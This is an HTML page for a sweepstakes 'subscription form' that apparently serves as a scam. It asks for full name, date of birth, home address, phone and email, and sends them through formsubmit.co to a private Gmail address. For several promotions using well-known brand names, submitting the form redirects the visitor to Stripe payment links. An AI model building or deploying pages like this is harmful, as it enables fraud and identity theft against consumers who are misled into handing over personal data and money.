<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Subscription Form - American Sweepstakes & Promotion Co.</title>
  <style>
    :root{--accent:#1e90ff}
    body{margin:0;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(135deg,#0047ab 0%,#ff0000 100%);color:#fff}
    .container{max-width:920px;margin:28px auto;padding:24px;background:linear-gradient(145deg,#0047ab,#ff0000);border-radius:12px}
    h1{margin:0;color:var(--accent)}
    .btn{display:inline-block;background:linear-gradient(90deg,#ffff00,#ff6600);color:#000;border:none;padding:10px 16px;border-radius:999px;cursor:pointer;text-decoration:none}
    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
    label{display:block;color:#111}
    input,select,textarea{box-sizing:border-box;width:100%;padding:8px;border-radius:6px;border:1px solid #ccc}
    .full{grid-column:1/-1}
    @media(max-width:640px){.container{margin:12px;padding:16px}.form-grid{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <main class="container">
    <header>
      <h1>American Sweepstakes & Promotion Co.</h1>
    </header>
    <section style="margin-top:18px">
      <h2 id="signupTitle">Subscription Form</h2>
      <p>Complete your personal details for the promotion you selected.</p>
      <form id="signupForm" action="https://formsubmit.co/ajax/hashmatali20001@gmail.com" method="POST">
        <input type="hidden" name="_subject" value="New Promotion Subscription" />
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_template" value="table" />
        <input type="hidden" name="chosenPromotion" id="chosenPromotionField" value="" />
        <div class="form-grid" style="margin-top:12px">
          <label>First Name<input type="text" name="firstName" autocomplete="given-name" required /></label>
          <label>Last Name<input type="text" name="lastName" autocomplete="family-name" required /></label>
          <label>Date of Birth<input type="date" name="dob" required /></label>
          <label>Street Address<input type="text" name="streetAddress" autocomplete="address-line1" required /></label>
          <label>Street Address 2 (optional)<input type="text" name="streetAddress2" autocomplete="address-line2" /></label>
          <label>City<input type="text" name="city" autocomplete="address-level2" required /></label>
          <label>State<select name="state" autocomplete="address-level1" required>
            <option value="">Select State</option>
            <option value="AL">Alabama</option>
            <option value="AK">Alaska</option>
            <option value="AZ">Arizona</option>
            <option value="AR">Arkansas</option>
            <option value="CA">California</option>
            <option value="CO">Colorado</option>
            <option value="CT">Connecticut</option>
            <option value="DE">Delaware</option>
            <option value="FL">Florida</option>
            <option value="GA">Georgia</option>
            <option value="HI">Hawaii</option>
            <option value="ID">Idaho</option>
            <option value="IL">Illinois</option>
            <option value="IN">Indiana</option>
            <option value="IA">Iowa</option>
            <option value="KS">Kansas</option>
            <option value="KY">Kentucky</option>
            <option value="LA">Louisiana</option>
            <option value="ME">Maine</option>
            <option value="MD">Maryland</option>
            <option value="MA">Massachusetts</option>
            <option value="MI">Michigan</option>
            <option value="MN">Minnesota</option>
            <option value="MS">Mississippi</option>
            <option value="MO">Missouri</option>
            <option value="MT">Montana</option>
            <option value="NE">Nebraska</option>
            <option value="NV">Nevada</option>
            <option value="NH">New Hampshire</option>
            <option value="NJ">New Jersey</option>
            <option value="NM">New Mexico</option>
            <option value="NY">New York</option>
            <option value="NC">North Carolina</option>
            <option value="ND">North Dakota</option>
            <option value="OH">Ohio</option>
            <option value="OK">Oklahoma</option>
            <option value="OR">Oregon</option>
            <option value="PA">Pennsylvania</option>
            <option value="RI">Rhode Island</option>
            <option value="SC">South Carolina</option>
            <option value="SD">South Dakota</option>
            <option value="TN">Tennessee</option>
            <option value="TX">Texas</option>
            <option value="UT">Utah</option>
            <option value="VT">Vermont</option>
            <option value="VA">Virginia</option>
            <option value="WA">Washington</option>
            <option value="WV">West Virginia</option>
            <option value="WI">Wisconsin</option>
            <option value="WY">Wyoming</option>
            <option value="DC">District of Columbia</option>
          </select></label>
          <label>ZIP Code<input type="text" name="zip" autocomplete="postal-code" inputmode="numeric" required /></label>
          <label>Telephone Number<input type="tel" name="telNumber" autocomplete="tel" required /></label>
          <label>Email Address<input type="email" name="emailAddress" autocomplete="email" required /></label>
          <label class="full">Notes (optional)<textarea name="notes" placeholder="Any additional info"></textarea></label>
        </div>
        <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap">
          <button class="btn" type="submit">Continue & Subscribe</button>
          <a class="btn" href="register.html" style="background:#fff;color:#000">Back to Promotions</a>
        </div>
        <p id="signupMessage" style="display:none;margin-top:10px;color:yellow"></p>
      </form>
    </section>
  </main>
  <script>
    const promotions = ['Sandals', 'Sheetz', 'Walmart', 'Stake Us & St Jude Dream Home', 'Wrestle Mania (WWE)', 'Set For Life Grand Promotion'];
    const chosenPromotion = new URLSearchParams(window.location.search).get('promotion');
    const signupForm = document.getElementById('signupForm');
    const signupMessage = document.getElementById('signupMessage');

    if (!promotions.includes(chosenPromotion)) {
      window.location.replace('register.html');
    } else {
      document.getElementById('signupTitle').textContent = 'Subscription Form: ' + chosenPromotion;
      document.getElementById('chosenPromotionField').value = chosenPromotion;
    }

    signupForm.addEventListener('submit', function(event){
      event.preventDefault();
      const submitButton = signupForm.querySelector('button[type="submit"]');
      if (submitButton) submitButton.disabled = true;
      if (chosenPromotion === 'Sandals') {
        window.location.href = 'https://buy.stripe.com/test_8x23cu8kc0KU9rNdeGfQI00';
        return;
      }
      if (chosenPromotion === 'Stake Us & St Jude Dream Home') {
        window.location.href = 'https://buy.stripe.com/test_dRmbJ0fME9hq8nJ4IafQI01';
        return;
      }
      if (chosenPromotion === 'Sheetz') {
        window.location.href = 'https://buy.stripe.com/test_cNi4gy7g8bpydI3a2ufQI02';
        return;
      }
      if (chosenPromotion === 'Wrestle Mania (WWE)') {
        window.location.href = 'https://buy.stripe.com/test_14A6oG8kc9hq7jF7UmfQI04';
        return;
      }
      fetch(signupForm.action, {method: signupForm.method, body: new FormData(signupForm)})
        .then(response => {
          if (response.ok) {
            alert('Thank you! Your subscription has been received. A representative will follow up via email.');
            signupForm.reset();
          } else {
            signupMessage.textContent = 'There was a problem sending your request. Please try again.';
            signupMessage.style.display = 'block';
          }
        })
        .catch(() => {
          signupMessage.textContent = 'There was a problem sending your request. Please try again.';
          signupMessage.style.display = 'block';
        })
        .finally(() => { if (submitButton) submitButton.disabled = false; });
    });
  </script>
</body>
</html>
